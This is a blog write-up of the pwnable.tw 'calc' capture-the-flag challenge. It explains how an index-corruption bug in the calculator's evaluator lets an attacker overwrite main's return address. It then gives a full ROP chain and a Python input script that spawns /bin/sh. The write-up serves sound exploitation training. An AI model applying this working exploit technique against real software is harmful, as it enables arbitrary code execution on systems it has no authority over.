---
layout: post
title: PWNABLE.tw calc challenge writeup
---
It's amazing how benign things in a binary can be exploited to gain complete control of the system. In this post I describe the details of solving challenge #3 (calc) on [www.pwnable.tw](pwnable). My previous `orw` challenge on the pwnable involved simple stack smashing to redirect code execution to the stack. This challenge however wasn't that simple.

### About the binary ###
The binary file is called and can be downloaded from the site for experimenting on it. On running the binary:
```
$ ./calc
=== Welcome to SECPROG calculator ===
8guk
--> 0
8+8
--> 16
hello
--> Merry Christmas!
$
```

The `checksec` utility reveals that stack execution has been disabled using NX bit.
```
$ checksec calc
[*] '/home/hema/calc'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

It functions as a calulator and exits with 'Merry Christmas' on entering alphabets.

Upon disassembly I observed the following program flow
```
	*main* --> *calc* --> *get_expr*
				  |-----> *init_pool*
				  |-----> *parse_expr*----->*eval*
```
### Initial approach ###
My first approach was to try and write a large string to check if it causes a segmentation fault. But as I observed the disassembly, the input is accepted into a stack area character-by-character using a read call for 1 byte length. This is done until a newline character is entered. The characters are copied from here to another allocated stack area of considerable size (1024 bytes). There was no nearby return address which could be modified from this area.
```
Disassembly of get_expr:
[ ... ]

   0x08048e53 <+15>:	mov    DWORD PTR [esp+0x8],0x1 ; length set to accept single character
   0x08048e5b <+23>:	lea    eax,[ebp-0xd]
   0x08048e5e <+26>:	mov    DWORD PTR [esp+0x4],eax
   0x08048e62 <+30>:	mov    DWORD PTR [esp],0x0		; accept from stdin
   0x08048e69 <+37>:	call   0x806e6d0 <read>			; call to read function

[ ... ]
```
In the `parse_expr` function I observed a `memcopy` function. I thought maybe this could be used to copy a lengthy operand to another area and corrupt the stack area. But this proved futile as the copy was done to to a heap area.

### I give up ###
I felt frustrated and decided to see some write ups. The first step to solving it was try and create a SEGFAULT like below:
```
$ ./calc
=== Welcome to SECPROG calculator ===
+1000000
--> Segmentation fault (core dumped)
```
I ran the binary with gdb and saw the segfault occured in the `calc` at the below instruction
```   
   0x080493f6 <+125>:	mov    eax,DWORD PTR [ebp-0x5a0]
   0x080493fc <+131>:	sub    eax,0x1
   0x080493ff <+134>:	mov    eax,DWORD PTR [ebp+eax*4-0x59c] <---- SEGFAULT here
   0x08049406 <+141>:	mov    DWORD PTR [esp+0x4],eax
   0x0804940a <+145>:	mov    DWORD PTR [esp],0x80bf804
   0x08049411 <+152>:	call   0x804ff60 <printf>
```
It indicates that the offset provided by the value in `eax` register was causing the program to access an illegal area. This is to access the result of the calculation operation before invoking printf on it.

At this point, I decide to use the python script solution mentioned in the writeup. But this did not work as there seems to issues with construction of the hack. But the article did point in the only possible direction to solve the challenge.
The calculation operation happens in the `eval` function called inside `parse_expr`. Here is a part of the `eval` disassembly for the add operation.
```
[ ... ]
   0x08048f1a <+57>:	mov    eax,DWORD PTR [ebp+0x8]
   0x08048f1d <+60>:	mov    eax,DWORD PTR [eax]
   0x08048f1f <+62>:	lea    edx,[eax-0x2]
   0x08048f22 <+65>:	mov    eax,DWORD PTR [ebp+0x8]
   0x08048f25 <+68>:	mov    eax,DWORD PTR [eax]
   0x08048f27 <+70>:	lea    ecx,[eax-0x2]
   0x08048f2a <+73>:	mov    eax,DWORD PTR [ebp+0x8]
   0x08048f2d <+76>:	mov    ecx,DWORD PTR [eax+ecx*4+0x4]
   0x08048f31 <+80>:	mov    eax,DWORD PTR [ebp+0x8]
   0x08048f34 <+83>:	mov    eax,DWORD PTR [eax]
   0x08048f36 <+85>:	lea    ebx,[eax-0x1]
   0x08048f39 <+88>:	mov    eax,DWORD PTR [ebp+0x8]
   0x08048f3c <+91>:	mov    eax,DWORD PTR [eax+ebx*4+0x4]
   0x08048f40 <+95>:	add    ecx,eax		<--------------------- The add operation
   0x08048f42 <+97>:	mov    eax,DWORD PTR [ebp+0x8]
   0x08048f45 <+100>:	mov    DWORD PTR [eax+edx*4+0x4],ecx
[ ... ]   
```
When we try a simple add like 1+2, it is held on the stack like so:
```
0xffffcb48:	0x00000002	0x00000001	0x00000002
```
The first word represents the number of operands, followed by the operands 1,2 themselves.

At the end of the operation, the stack looks like this:
```
0xffffcb48:	0x00000002	0x00000003	0x00000002
```
The result (0x3) is stored in place of the first operand and the index (0x2) is used later in `calc` to access this result.
 
### The Hack ###
But something peculiar happens when the input contains a single operand like +100, it is held on the stack like this
```
0xffffcb48:	0x00000001	0x00000064	0x00000000
```
By the end of the add operation and copying the result back to stack.
```
0xffffcb48:	0x00000065	0x00000064  0x00000000
```
It has erroneously overwritten the word used to hold an index to the result. Now when this index is accessed in the `calc` function:
```
mov eax,DWORD PTR [ebp+ eax*4 -0x59c]
	BECOMES
mov eax,DWORD PTR [ebp + 0x65*4-0x59c]
	INSTEAD OF 
mov eax,DWORD PTR [ebp+ 1*4 -0x59c]
```
When this causes out-of-range memory accesses, a SEGFAULT occurs.

On repeating the expression with another operand like +100+10, two iterations of add occur in the `eval` function.

On the first iteration, the index is corrupted
```
0xffffcb48:	0x00000065	0x00000064  0x00000000
```
On the second iteration 
```
base = 0xffffcb48
operand_1 = *(base + (0x65-2)*4 + 0x4)
operand_2 = *(base + (0x65-1)*4 + 0x4) <------ In this case value at this address is '10'
result = operand_1 + operand_2
*(base + (0x65-2)*4 + 0x4) = result
```
The result is stored into the location of operand_1.

This feature of corrupting the index and using it to write into another area in the stack can be used to corrupt the return address in the main function.
The return address for me was located at `0xffffd10c`
Difference between the `base(0xffffcb48)` and `0xffffd10c` is `0x5c4` or `1476`.

`(x-2)*4 + 4 = 1476`

`x = 370 or 0x172`

'x' is the index value. 

Our input must be `1` lower than this, making it `0x171` or `369`.

Now operand_1 will be the return address held in the main function's stack area and operand_2 is to be crafted to point the `result` value to address of executable areas in the program containing ROP gadgets. ROP gadgets are specific areas of the executable part of a program which can be used to execute custom instructions

For example, if operand_1 is `0x0804967a` and operand_2 is `0x‭26B30‬ (158512)`, the result is `0x80701aa`‬ and instructions at this address are `pop edx; ret`. When this result overwrites the return address of `main`, it causes random code execution.

It can be observed that following `pop edx` there is `ret`, which essentially causes the next value on the stack to be loaded into the program counter.
The writeup gives the list instructions and their addresses in the executable section of the memory that leads to the creation of a shell process which we can use to read the flag.

```
ADDRESS	   # INSTRUCTION
0x080701aa # pop edx ; ret
0x080ec060 # @ .data
0x0805c34b # pop eax ; ret
0x6e69622f # 'bin'
0x0809b30d # mov dword ptr [edx], eax ; ret
0x080701aa # pop edx ; ret
0x080ec064 # @ .data + 4
0x0805c34b # pop eax ; ret
0x68732f2f # '//sh'
0x0809b30d # mov dword ptr [edx], eax ; ret
0x080701aa # pop edx ; ret
0x080ec068 # @ .data + 8
0x080550d0 # xor eax, eax ; ret
0x0809b30d # mov dword ptr [edx], eax ; ret
0x080481d1 # pop ebx ; ret
0x080ec060 # @ .data
0x080701d1 # pop ecx ; pop ebx ; ret
0x080ec068 # @ .data + 8
0x080ec060 # padding without overwrite ebx
0x080701aa # pop edx ; ret
0x080ec068 # @ .data + 8
0x080550d0 # xor eax, eax ; ret
0x0807cb7f # inc eax ; ret
0x0807cb7f # inc eax ; ret
0x0807cb7f # inc eax ; ret
0x0807cb7f # inc eax ; ret
0x0807cb7f # inc eax ; ret
0x0807cb7f # inc eax ; ret
0x0807cb7f # inc eax ; ret
0x0807cb7f # inc eax ; ret
0x0807cb7f # inc eax ; ret
0x0807cb7f # inc eax ; ret
0x0807cb7f # inc eax ; ret
0x08049a21 # int 0x80
```

So the input is of the following form
```
INDEX +/- OFFSET

INDEX	---> Used to point to word locations on stack starting from return address in main
OFFSET	---> Added/Subtracted to existing value on stack to result in address of executable code
```
### The final solution ###
```python
print("+369+158512")
print("+370+135025968")
print("+371-430565")
print("+372+1851969610")
print("+373-1717116221")
print("+374-1582439315")
print("+375-1447254831")
print("+376-1312659428")
print("+377+439719755")
print("+378-304866366")
print("+379-170189460")
print("+380-35004972")
print("+381+99561124")
print("+382+35292265")
print("+383+99220840")
print("+384+35963640")
print("+385+98713305")
print("+386+36471183")
print("+387+98713297")
print("+388+35963609")
print("+389+99220879")
print("+390+35345217")
print("+391+99383358")
print("+392+35345217")
print("+393+99383358")
print("+394+35345217")
print("+395+99383358")
print("+396+35345217")
print("+397+99383358")
print("+398+35345217")
print("+399+99383358")
print("+400+35345217")
print("+401+99383358")
print("+402+35135971")
print("h")
```
The last alphabet print triggers the exit of main function and starts arbitarty code execution.

Phew, that was a lot to learn in one challenge. Try the challenge and let me know what you think.


#### References ####
1. [The first solution..well almost](http://phobosys.de/blog_january_20.html)
2. [ROPgadget](https://github.com/JonathanSalwan/ROPgadget)
3. [checksec](https://github.com/slimm609/checksec.sh)
